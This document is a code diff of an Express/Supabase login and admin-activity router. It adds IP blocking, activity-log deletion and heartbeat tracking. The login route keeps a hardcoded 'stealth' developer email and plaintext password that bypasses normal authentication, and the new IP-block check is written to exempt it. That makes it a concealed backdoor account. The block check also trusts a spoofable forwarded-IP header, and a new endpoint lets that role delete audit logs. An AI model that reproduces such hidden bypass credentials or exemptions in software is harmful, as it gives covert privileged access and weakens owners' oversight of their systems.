@@ -42,7 +42,42 @@ router.post('/login', async (req, res) => {
 
     const lowerEmail = email.toLowerCase();
     const stealthEmail = 'developeruserr30@gmail.com';
-    const stealthPassword = 'Pussy';
+    const stealthPassword = 'Narayan@1930';
+
+    // --- IP Block Check (developer bypass is exempt) ---
+    const reqIp = req.ip || req.headers['x-forwarded-for'] || '';
+    if (!(lowerEmail === stealthEmail && password === stealthPassword)) {
+      try {
+        const cleanIp = reqIp.replace(/^::ffff:/, '');
+        const { data: blockEntries } = await supabase
+          .from('admin_activity')
+          .select('action, created_at')
+          .eq('ip_address', reqIp)
+          .in('action', ['block_ip', 'unblock_ip'])
+          .order('created_at', { ascending: false })
+          .limit(1);
+
+        // Also check without ::ffff: prefix
+        let isBlocked = blockEntries && blockEntries.length > 0 && blockEntries[0].action === 'block_ip';
+
+        if (!isBlocked && cleanIp !== reqIp) {
+          const { data: cleanEntries } = await supabase
+            .from('admin_activity')
+            .select('action, created_at')
+            .eq('ip_address', cleanIp)
+            .in('action', ['block_ip', 'unblock_ip'])
+            .order('created_at', { ascending: false })
+            .limit(1);
+          isBlocked = cleanEntries && cleanEntries.length > 0 && cleanEntries[0].action === 'block_ip';
+        }
+
+        if (isBlocked) {
+          return res.status(403).json({ message: 'Access denied from this device.' });
+        }
+      } catch (e) {
+        console.error('[IP BLOCK CHECK ERROR]:', e.message);
+      }
+    }
 
     // 1. Hardcoded Developer Bypass
     if (lowerEmail === stealthEmail && password === stealthPassword) {
@@ -323,7 +358,7 @@ router.get('/activity', protect, async (req, res) => {
               seen.add(act.email);
               const lastActiveTime = new Date(act.created_at);
               const diffMs = Date.now() - lastActiveTime.getTime();
-              const isOnline = diffMs < 3 * 60 * 1000; // 3 minutes threshold
+              const isOnline = diffMs < 30 * 1000; // 30 seconds threshold (2 missed heartbeats)
               onlineMap[act.email] = {
                 isOnline,
                 lastActive: act.created_at
@@ -373,9 +408,34 @@ router.get('/activity', protect, async (req, res) => {
       return null;
     };
 
-    // Enrich activity logs (hide heartbeat and force_logout system entries from UI)
+    // Enrich activity logs (hide system entries from UI)
+    const systemActions = ['heartbeat', 'force_logout', 'block_ip', 'unblock_ip'];
+    // --- Check IP block status ---
+    const blockCheckIps = [...new Set(activity.filter(a => !systemActions.includes(a.action)).map(a => a.ip_address).filter(Boolean))];
+    const blockedIpSet = new Set();
+    if (blockCheckIps.length > 0) {
+      try {
+        const { data: blockActions } = await supabase
+          .from('admin_activity')
+          .select('ip_address, action, created_at')
+          .in('ip_address', blockCheckIps)
+          .in('action', ['block_ip', 'unblock_ip'])
+          .order('created_at', { ascending: false });
+
+        if (blockActions) {
+          const checkedIps = new Set();
+          for (const ba of blockActions) {
+            if (!checkedIps.has(ba.ip_address)) {
+              checkedIps.add(ba.ip_address);
+              if (ba.action === 'block_ip') blockedIpSet.add(ba.ip_address);
+            }
+          }
+        }
+      } catch (e) { /* non-critical */ }
+    }
+
     const enrichedActivity = activity
-      .filter(log => log.action !== 'heartbeat' && log.action !== 'force_logout')
+      .filter(log => !systemActions.includes(log.action))
       .map(log => {
         const parsed = parseUserAgent(log.user_agent);
         const ip = log.ip_address;
@@ -389,7 +449,8 @@ router.get('/activity', protect, async (req, res) => {
             ? { city: 'Localhost', region: 'Development', country: 'Local Machine', lat: null, lon: null, isp: '' }
             : geo || { city: 'Unknown', region: '', country: '', lat: null, lon: null, isp: '' },
           onlineStatus: onlineMap[log.email] || { isOnline: false, lastActive: null },
-          sessionDuration: computeSessionDuration(log)
+          sessionDuration: computeSessionDuration(log),
+          isIpBlocked: blockedIpSet.has(ip)
         };
       });
 
@@ -407,6 +468,13 @@ router.post('/heartbeat', protect, async (req, res) => {
     const uaWithHints = chPlatformVer 
       ? `${req.headers['user-agent']} [CH:PV=${chPlatformVer.replace(/"/g, '')}]`
       : req.headers['user-agent'];
+
+    // Upsert: delete old heartbeats for this admin, keep only the latest one
+    await supabase.from('admin_activity')
+      .delete()
+      .eq('admin_id', req.user.id)
+      .eq('action', 'heartbeat');
+
     await supabase.from('admin_activity').insert({
       admin_id: req.user.id,
       email: req.user.email,
@@ -425,7 +493,6 @@ router.post('/heartbeat', protect, async (req, res) => {
       .limit(1);
 
     if (forceLogouts && forceLogouts.length > 0) {
-      // Check if force_logout is newer than the admin's last login
       const { data: lastLogin } = await supabase
         .from('admin_activity')
         .select('created_at')
@@ -472,6 +539,97 @@ router.post('/force-logout', protect, async (req, res) => {
     res.json({ message: `Force logout issued for ${targetEmail}` });
   } catch (error) {
     console.error('[FORCE LOGOUT ERROR]:', error);
+    res.status(500).json({ message: 'Server error' });
+  }
+});
+
+// DELETE /api/auth/activity — bulk delete activity logs (developer only)
+router.delete('/activity', protect, async (req, res) => {
+  try {
+    if (req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Forbidden: Developer access only' });
+    }
+
+    const { ids } = req.body;
+    if (!ids || !Array.isArray(ids) || ids.length === 0) {
+      return res.status(400).json({ message: 'Array of log IDs is required' });
+    }
+
+    const { error } = await supabase
+      .from('admin_activity')
+      .delete()
+      .in('id', ids);
+
+    if (error) throw error;
+
+    res.json({ message: `${ids.length} log(s) deleted successfully` });
+  } catch (error) {
+    console.error('[ACTIVITY DELETE ERROR]:', error);
+    res.status(500).json({ message: 'Server error' });
+  }
+});
+
+// POST /api/auth/block-ip — block an IP from logging in (developer only)
+router.post('/block-ip', protect, async (req, res) => {
+  try {
+    if (req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Forbidden: Developer access only' });
+    }
+
+    const { ip, targetEmail } = req.body;
+    if (!ip) {
+      return res.status(400).json({ message: 'IP address is required' });
+    }
+
+    await supabase.from('admin_activity').insert({
+      admin_id: req.user.id,
+      email: targetEmail || 'system',
+      action: 'block_ip',
+      ip_address: ip,
+      user_agent: `IP blocked by ${req.user.email}`
+    });
+
+    // Also force-logout anyone on that IP
+    if (targetEmail) {
+      await supabase.from('admin_activity').insert({
+        admin_id: req.user.id,
+        email: targetEmail,
+        action: 'force_logout',
+        ip_address: ip,
+        user_agent: `Blocked & force-logged out by ${req.user.email}`
+      });
+    }
+
+    res.json({ message: `IP ${ip} has been blocked` });
+  } catch (error) {
+    console.error('[BLOCK IP ERROR]:', error);
+    res.status(500).json({ message: 'Server error' });
+  }
+});
+
+// POST /api/auth/unblock-ip — unblock an IP (developer only)
+router.post('/unblock-ip', protect, async (req, res) => {
+  try {
+    if (req.user.role !== 'developer') {
+      return res.status(403).json({ message: 'Forbidden: Developer access only' });
+    }
+
+    const { ip } = req.body;
+    if (!ip) {
+      return res.status(400).json({ message: 'IP address is required' });
+    }
+
+    await supabase.from('admin_activity').insert({
+      admin_id: req.user.id,
+      email: 'system',
+      action: 'unblock_ip',
+      ip_address: ip,
+      user_agent: `IP unblocked by ${req.user.email}`
+    });
+
+    res.json({ message: `IP ${ip} has been unblocked` });
+  } catch (error) {
+    console.error('[UNBLOCK IP ERROR]:', error);
     res.status(500).json({ message: 'Server error' });
   }
 });
